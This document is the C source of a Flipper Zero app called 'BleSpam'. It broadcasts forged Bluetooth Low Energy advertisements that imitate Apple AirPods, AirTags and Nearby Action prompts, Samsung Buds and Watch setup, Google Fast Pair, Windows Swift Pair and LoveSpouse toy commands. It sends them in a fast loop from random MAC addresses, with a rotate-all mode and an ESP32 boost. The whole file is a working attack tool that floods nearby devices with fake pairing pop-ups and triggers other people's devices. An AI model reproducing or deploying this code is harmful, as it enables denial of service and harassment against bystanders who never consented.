#include <furi.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <furi_hal_light.h>
#include <furi_hal_random.h>
#include <extra_beacon.h>
#include <string.h>

#include "esp_boost.h"

// ── Device list ───────────────────────────────────────────────────────────
typedef enum { TypeApplePair, TypeAppleAction, TypeSamsung, TypeSamsungWatch, TypeAndroid, TypeWindows, TypeLovePlay, TypeLoveStop, TypeRotate } DevType;

typedef struct {
    const char* name;
    DevType type;
    uint32_t param;
    uint8_t extra; // prefix for Pair, flags for Action
} Dev;

static const Dev devs[] = {
    // Apple Proximity Pair — exact backup format
    {"AirPods",            TypeApplePair,   0x0220, 0x01},
    {"AirPods 2",          TypeApplePair,   0x0F20, 0x01},
    {"AirPods 3",          TypeApplePair,   0x1320, 0x01},
    {"AirPods Pro",        TypeApplePair,   0x0E20, 0x01},
    {"AirPods Pro 2",      TypeApplePair,   0x1420, 0x01},
    {"AirPods Max",        TypeApplePair,   0x0A20, 0x01},
    {"Beats Flex",         TypeApplePair,   0x1020, 0x01},
    {"Beats Studio Buds",  TypeApplePair,   0x1120, 0x01},
    {"Beats Studio Buds+", TypeApplePair,   0x1620, 0x01},
    {"Beats Solo 3",       TypeApplePair,   0x0620, 0x01},
    {"Beats Studio 3",     TypeApplePair,   0x0920, 0x01},
    {"Beats Fit Pro",      TypeApplePair,   0x1220, 0x01},
    {"Beats X",            TypeApplePair,   0x0520, 0x01},
    {"Powerbeats 3",       TypeApplePair,   0x0320, 0x01},
    {"Powerbeats Pro",     TypeApplePair,   0x0B20, 0x01},
    {"AirTag",             TypeApplePair,   0x0055, 0x05},
    {"Hermes AirTag",      TypeApplePair,   0x0030, 0x05},
    // Apple Nearby Action — verified working
    {"Apple Vision Pro",   TypeAppleAction, 0x24, 0xC0},
    {"AppleTV Pair",       TypeAppleAction, 0x06, 0xC0},
    {"Join AppleTV?",      TypeAppleAction, 0x20, 0xBF},
    {"HomePod Setup",      TypeAppleAction, 0x0B, 0xC0},
    {"Transfer Number",    TypeAppleAction, 0x02, 0xC0},
    {"AppleTV Connect..",  TypeAppleAction, 0x27, 0xC0},
    {"AppleTV ColorBal",   TypeAppleAction, 0x1E, 0xC0},
    {"AppleID AppleTV?",   TypeAppleAction, 0x2B, 0xC0},
    {"Sign In Device",     TypeAppleAction, 0x2F, 0xC0},
    {"HomeKit AppleTV",    TypeAppleAction, 0x0D, 0xC0},
    // Samsung
    {"Samsung Buds Pro",   TypeSamsung,     0xB8B905, 0},
    {"Samsung Buds 2",     TypeSamsung,     0xEAAA17, 0},
    {"Samsung Buds Live",  TypeSamsung,     0x850116, 0},
    {"Samsung Buds FE",    TypeSamsung,     0xEE7A0C, 0},
    {"Samsung Buds2 Purp", TypeSamsung,     0x39EA48, 0},
    {"Samsung Watch4 44",  TypeSamsungWatch,0x04, 0},
    {"Samsung Watch5 44",  TypeSamsungWatch,0x11, 0},
    {"Samsung Watch6 40",  TypeSamsungWatch,0x1B, 0},
    {"Samsung Watch Ultra",TypeSamsungWatch,0x0C, 0},
    // Android / Windows
    {"Android Fast Pair",  TypeAndroid,     0, 0},
    {"Windows Swift Pair", TypeWindows,     0, 0},
    // LoveSpouse
    {"LoveSpouse Play",    TypeLovePlay,    0, 0},
    {"LoveSpouse Stop",    TypeLoveStop,    0, 0},
    // Rotate all
    {"[ALL] Rotate",       TypeRotate,      0, 0},
};
#define DEV_COUNT ((int)COUNT_OF(devs))

// ── Packet builders — exact backup format ─────────────────────────────────

static uint8_t build_pair(uint8_t* p, uint16_t model, uint8_t prefix) {
    uint8_t i = 0;
    p[i++] = 30; p[i++] = 0xFF; p[i++] = 0x4C; p[i++] = 0x00;
    p[i++] = 0x07; p[i++] = 0x19;
    if(prefix == 0x05) {
        // AirTag — hardcoded model bytes from backup
        p[i++] = 0x05;
        p[i++] = (model >> 8) & 0xFF;
        p[i++] = model & 0xFF;
        p[i++] = 0x55;
        furi_hal_random_fill_buf(&p[i], 19);
    } else {
        // Audio device — backup battery byte range: rand()%16
        p[i++] = prefix;
        p[i++] = (model >> 8) & 0xFF;
        p[i++] = model & 0xFF;
        p[i++] = 0x55;
        p[i++] = ((rand() % 16) << 4) | (rand() % 16);
        p[i++] = ((rand() % 16) << 4) | (rand() % 16);
        p[i++] = rand() % 256;
        p[i++] = 0x00; p[i++] = 0x00;
        furi_hal_random_fill_buf(&p[i], 16);
    }
    return 31;
}

static uint8_t build_action(uint8_t* p, uint8_t action, uint8_t flags) {
    uint8_t i = 0;
    p[i++] = 10; p[i++] = 0xFF; p[i++] = 0x4C; p[i++] = 0x00;
    p[i++] = 0x0F; p[i++] = 0x05;
    p[i++] = flags; p[i++] = action;
    furi_hal_random_fill_buf(&p[i], 3);
    return 11;
}

static uint8_t build_samsung(uint8_t* p, uint32_t model) {
    // Willy-JL verified Samsung Buds EasySetup format (31 bytes)
    uint8_t i = 0;
    p[i++]=27; p[i++]=0xFF; p[i++]=0x75; p[i++]=0x00;
    p[i++]=0x42; p[i++]=0x09; p[i++]=0x81; p[i++]=0x02;
    p[i++]=0x14; p[i++]=0x15; p[i++]=0x03; p[i++]=0x21;
    p[i++]=0x01; p[i++]=0x09;
    p[i++]=(model>>16)&0xFF; p[i++]=(model>>8)&0xFF;
    p[i++]=0x01; p[i++]=model&0xFF;
    p[i++]=0x06; p[i++]=0x3C; p[i++]=0x94; p[i++]=0x8E;
    p[i++]=0x00; p[i++]=0x00; p[i++]=0x00; p[i++]=0x00;
    p[i++]=0xC7; p[i++]=0x00;
    // Truncated second AD segment (Android fills rest with zeros)
    p[i++]=16; p[i++]=0xFF; p[i++]=0x75;
    return 31;
}

static const uint32_t fp_models[] = {
    0xCD8256,0x821F66,0xF52494,0xD446A7,0x2D7A23,
    0x0E30C3,0x92BBBD,0x0577B1,0x05A9BC,0x00000C,
};
static uint8_t build_fastpair(uint8_t* p) {
    uint32_t m = fp_models[rand() % COUNT_OF(fp_models)];
    uint8_t i = 0;
    p[i++]=0x03; p[i++]=0x03; p[i++]=0x2C; p[i++]=0xFE;
    p[i++]=0x06; p[i++]=0x16; p[i++]=0x2C; p[i++]=0xFE;
    p[i++]=(m>>16)&0xFF; p[i++]=(m>>8)&0xFF; p[i++]=m&0xFF;
    return 11;
}
static uint8_t build_swiftpair(uint8_t* p) {
    // Willy-JL verified format: Microsoft company ID 0x0006
    uint8_t i = 0;
    uint8_t name_len = 9;
    const char* name = "Flipper Z";
    uint8_t size = 7 + name_len;
    p[i++] = size - 1;
    p[i++] = 0xFF; p[i++] = 0x06; p[i++] = 0x00;
    p[i++] = 0x03; p[i++] = 0x00; p[i++] = 0x80;
    memcpy(&p[i], name, name_len); i += name_len;
    return i;
}

static uint8_t build_samsung_watch(uint8_t* p, uint8_t model) {
    // Willy-JL verified Samsung Watch EasySetup format
    uint8_t i = 0;
    p[i++] = 14; p[i++] = 0xFF;
    p[i++] = 0x75; p[i++] = 0x00;
    p[i++] = 0x01; p[i++] = 0x00;
    p[i++] = 0x02; p[i++] = 0x00;
    p[i++] = 0x01; p[i++] = 0x01;
    p[i++] = 0xFF; p[i++] = 0x00;
    p[i++] = 0x00; p[i++] = 0x43;
    p[i++] = model;
    return 15;
}

static const uint32_t love_plays[] = {
    0xE49C6C, 0xE7075E, 0xE68E4F, 0xE1313B, 0xE0B82A,
    0xE32318, 0xE2AA09, 0xED5DF1, 0xECD4E0,
};
static const uint32_t love_stops[] = {
    0xE5157D, 0xD5964C, 0xA5113F,
};

static uint8_t build_lovespouse(uint8_t* p, bool play) {
    uint32_t mode = play
        ? love_plays[rand() % COUNT_OF(love_plays)]
        : love_stops[rand() % COUNT_OF(love_stops)];
    uint8_t i = 0;
    p[i++] = 2; p[i++] = 0x01; p[i++] = 0x1A;
    p[i++] = 14; p[i++] = 0xFF;
    p[i++] = 0xFF; p[i++] = 0x00;
    p[i++] = 0x6D; p[i++] = 0xB6; p[i++] = 0x43; p[i++] = 0xCE;
    p[i++] = 0x97; p[i++] = 0xFE; p[i++] = 0x42; p[i++] = 0x7C;
    p[i++] = (mode >> 16) & 0xFF;
    p[i++] = (mode >> 8) & 0xFF;
    p[i++] = mode & 0xFF;
    p[i++] = 3; p[i++] = 0x03; p[i++] = 0x8F; p[i++] = 0xAE;
    return 22;
}

// ── ESP boost helper ─────────────────────────────────────────────────────

static EspBoostCmd dev_type_to_esp_cmd(DevType type) {
    switch(type) {
    case TypeApplePair:
    case TypeAppleAction:
        return EspBoostCmdApple;
    case TypeSamsung:
    case TypeSamsungWatch:
        return EspBoostCmdSamsung;
    case TypeAndroid:
        return EspBoostCmdGoogle;
    case TypeWindows:
        return EspBoostCmdWindows;
    default:
        return EspBoostCmdRandom;
    }
}

// ── App state ─────────────────────────────────────────────────────────────

typedef struct {
    ViewDispatcher* vd;
    View* view;
    volatile bool running;
    FuriThread* worker;
    int sel;      // current selected index
    bool last_ok;
    EspBoost* esp;
} App;

// ── Worker ────────────────────────────────────────────────────────────────

static int32_t worker_fn(void* ctx) {
    App* app = ctx;
    uint32_t c = 0;
    bool rotate = (devs[app->sel].type == TypeRotate);

    while(app->running) {
        const Dev* d = rotate ? &devs[c % (DEV_COUNT - 1)] : &devs[app->sel];

        uint8_t mac[6];
        furi_hal_random_fill_buf(mac, 6);
        mac[0] = 0xC0 | (mac[0] & 0x3F);

        GapExtraBeaconConfig cfg = {0};
        cfg.min_adv_interval_ms = 20;
        cfg.max_adv_interval_ms = 50;
        cfg.adv_channel_map = GapAdvChannelMapAll;
        cfg.adv_power_level = GapAdvPowerLevel_6dBm;
        cfg.address_type = GapAddressTypeRandom;
        memcpy(cfg.address, mac, 6);

        uint8_t data[31] = {0};
        uint8_t len = 31;
        switch(d->type) {
        case TypeApplePair:   len = build_pair(data, d->param, d->extra); break;
        case TypeAppleAction: len = build_action(data, d->param, d->extra); break;
        case TypeSamsung:     len = build_samsung(data, d->param); break;
        case TypeSamsungWatch:len = build_samsung_watch(data, d->param); break;
        case TypeAndroid:     len = build_fastpair(data); break;
        case TypeWindows:     len = build_swiftpair(data); break;
        case TypeLovePlay:    len = build_lovespouse(data, true); break;
        case TypeLoveStop:    len = build_lovespouse(data, false); break;
        default: break;
        }

        furi_hal_bt_extra_beacon_stop();
        furi_hal_bt_extra_beacon_set_config(&cfg);
        furi_hal_bt_extra_beacon_set_data(data, len);

        bool ok = furi_hal_bt_extra_beacon_start();
        app->last_ok = ok;
        furi_hal_light_set(LightBlue, ok ? 0xFF : 0x00);
        furi_hal_light_set(LightRed,  ok ? 0x00 : 0xFF);

        c++;
        for(int i = 0; i < 5 && app->running; i++) furi_delay_ms(20);
    }

    // Clean stop — double-stop + small delay to ensure BT stack is clean
    furi_hal_bt_extra_beacon_stop();
    furi_delay_ms(20);
    furi_hal_bt_extra_beacon_stop();
    // Restore normal BT advertising if it was active before
    if(furi_hal_bt_is_alive() && !furi_hal_bt_is_active()) {
        furi_hal_bt_start_advertising();
    }
    furi_hal_light_set(LightBlue, 0x00);
    furi_hal_light_set(LightRed, 0x00);
    return 0;
}

static void do_stop(App* app) {
    if(!app->running) return;
    app->running = false;
    if(app->worker) {
        furi_thread_join(app->worker);
        furi_thread_free(app->worker);
        app->worker = NULL;
    }
    furi_hal_bt_extra_beacon_stop();
    furi_hal_light_set(LightBlue, 0x00);
    furi_hal_light_set(LightRed, 0x00);

    // ESP32 boost stop
    if(app->esp) esp_boost_stop(app->esp);
}

static void do_start(App* app) {
    if(app->running || !furi_hal_bt_is_alive()) return;
    if(furi_hal_bt_is_active()) furi_hal_bt_stop_advertising();
    app->running = true;
    app->worker = furi_thread_alloc();
    furi_thread_set_name(app->worker, "BleSpam");
    furi_thread_set_stack_size(app->worker, 2048);
    furi_thread_set_callback(app->worker, worker_fn);
    furi_thread_set_context(app->worker, app);
    furi_thread_start(app->worker);

    // ESP32 boost start
    if(app->esp) {
        EspBoostCmd cmd = dev_type_to_esp_cmd(devs[app->sel].type);
        esp_boost_start(app->esp, cmd);
    }
}

// ── View ──────────────────────────────────────────────────────────────────

typedef struct { bool running; int sel; bool ok; bool esp; } VM;

static void draw_cb(Canvas* canvas, void* mv) {
    VM* m = mv;
    canvas_clear(canvas);

    // Header
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 8, AlignCenter, AlignCenter, devs[m->sel].name);

    // Status
    canvas_set_font(canvas, FontSecondary);
    if(m->running) {
        const char* status = m->ok ? "Broadcasting  BLE:OK" : "Broadcasting  BLE:ERR";
        canvas_draw_str_aligned(canvas, 64, 22, AlignCenter, AlignCenter, status);
    } else {
        canvas_draw_str_aligned(canvas, 64, 22, AlignCenter, AlignCenter, "Stopped");
    }

    // Index + ESP indicator
    char idx[32];
    if(m->esp)
        snprintf(idx, sizeof(idx), "%d / %d  [ESP]", m->sel + 1, DEV_COUNT);
    else
        snprintf(idx, sizeof(idx), "%d / %d", m->sel + 1, DEV_COUNT);
    canvas_draw_str_aligned(canvas, 64, 34, AlignCenter, AlignCenter, idx);

    // Buttons
    elements_button_center(canvas, m->running ? "STOP" : "START");
    elements_button_left(canvas, "< Prev");
    elements_button_right(canvas, "Next >");
}

static bool input_cb(InputEvent* ev, void* ctx) {
    App* app = ctx;
    if(ev->type != InputTypeShort &&
       ev->type != InputTypeLong &&
       ev->type != InputTypeRepeat) return false;

    bool was_running = app->running;

    switch(ev->key) {
    case InputKeyOk:
        if(ev->type == InputTypeShort) {
            if(app->running) do_stop(app);
            else do_start(app);
        }
        break;
    case InputKeyLeft:
    case InputKeyUp:
        do_stop(app);
        app->sel = (app->sel - 1 + DEV_COUNT) % DEV_COUNT;
        if(was_running) do_start(app);
        break;
    case InputKeyRight:
    case InputKeyDown:
        do_stop(app);
        app->sel = (app->sel + 1) % DEV_COUNT;
        if(was_running) do_start(app);
        break;
    case InputKeyBack:
        do_stop(app);
        view_dispatcher_stop(app->vd);
        break;
    default:
        return false;
    }

    with_view_model(app->view, VM* m, {
        m->running = app->running;
        m->sel = app->sel;
        m->ok = app->last_ok;
    }, true);
    return true;
}

// ── Main ──────────────────────────────────────────────────────────────────

int32_t x_ble_spam_main(void* p) {
    UNUSED(p);
    App* app = malloc(sizeof(App));
    memset(app, 0, sizeof(App));

    // ESP32 boost init (transparent — NULL if no ESP32)
    app->esp = esp_boost_init();

    app->vd = view_dispatcher_alloc();
    app->view = view_alloc();
    view_allocate_model(app->view, ViewModelTypeLocking, sizeof(VM));
    with_view_model(app->view, VM* m, {
        m->running = false; m->sel = 0; m->ok = false;
        m->esp = esp_boost_is_connected(app->esp);
    }, false);
    view_set_context(app->view, app);
    view_set_draw_callback(app->view, draw_cb);
    view_set_input_callback(app->view, input_cb);

    view_dispatcher_add_view(app->vd, 0, app->view);
    view_dispatcher_switch_to_view(app->vd, 0);

    Gui* gui = furi_record_open(RECORD_GUI);
    view_dispatcher_attach_to_gui(app->vd, gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_run(app->vd);
    furi_record_close(RECORD_GUI);

    do_stop(app);
    view_dispatcher_remove_view(app->vd, 0);
    view_free(app->view);
    view_dispatcher_free(app->vd);

    esp_boost_free(app->esp);
    free(app);
    return 0;
}
